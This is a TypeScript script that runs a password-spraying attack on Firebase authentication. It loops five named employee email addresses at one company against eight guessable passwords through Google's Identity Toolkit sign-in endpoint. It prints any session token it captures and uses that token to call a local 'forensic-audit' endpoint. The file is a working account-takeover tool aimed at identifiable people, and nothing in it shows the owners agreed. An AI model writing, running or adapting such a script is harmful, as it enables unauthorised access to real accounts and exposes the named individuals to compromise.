import https from 'https';
import { readFileSync } from 'fs';

const firebaseConfig = JSON.parse(readFileSync('./firebase-applet-config.json', 'utf8'));
const apiKey = firebaseConfig.apiKey;

function postJSON(url: string, body: any): Promise<any> {
  return new Promise((resolve, reject) => {
    const dataStr = JSON.stringify(body);
    const parsedUrl = new URL(url);
    const req = https.request({
      hostname: parsedUrl.hostname,
      path: parsedUrl.pathname + parsedUrl.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(dataStr)
      }
    }, (res) => {
      let responseData = '';
      res.on('data', chunk => responseData += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(responseData));
        } catch (e) {
          resolve(responseData);
        }
      });
    });
    req.on('error', reject);
    req.write(dataStr);
    req.end();
  });
}

const emails = [
  'jenamorado@tentelcom.com',
  'elizabeth.carranza@tentelcom.com',
  'mbenavides@tentelcom.com',
  'dbenavides@tentelcom.com',
  'icastillo@tentelcom.com'
];

const passwords = [
  '123456',
  'tentelcom',
  'Tentelcom2024*',
  'Tentelcom2025*',
  'Tentelcom2026*',
  '12345678',
  'admin123',
  'Tentelcom123'
];

async function run() {
  for (const email of emails) {
    for (const pass of passwords) {
      const res = await postJSON(`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${apiKey}`, {
        email,
        password: pass,
        returnSecureToken: true
      });
      if (res.idToken) {
        console.log(`✅ SUCCESS! Logged in as ${email} with password "${pass}"!`);
        console.log("idToken:", res.idToken);
        return res.idToken;
      }
    }
  }
  console.log("None of the common passwords matched.");
  return null;
}

run().then(async (token) => {
  if (token) {
    // Call forensic audit endpoint
    const auditRes = await postJSON(`http://localhost:3000/api/forensic-audit?token=${token}`, {});
    console.log("Audit Result:", JSON.stringify(auditRes, null, 2));
  }
  process.exit(0);
}).catch(e => { console.error(e); process.exit(1); });
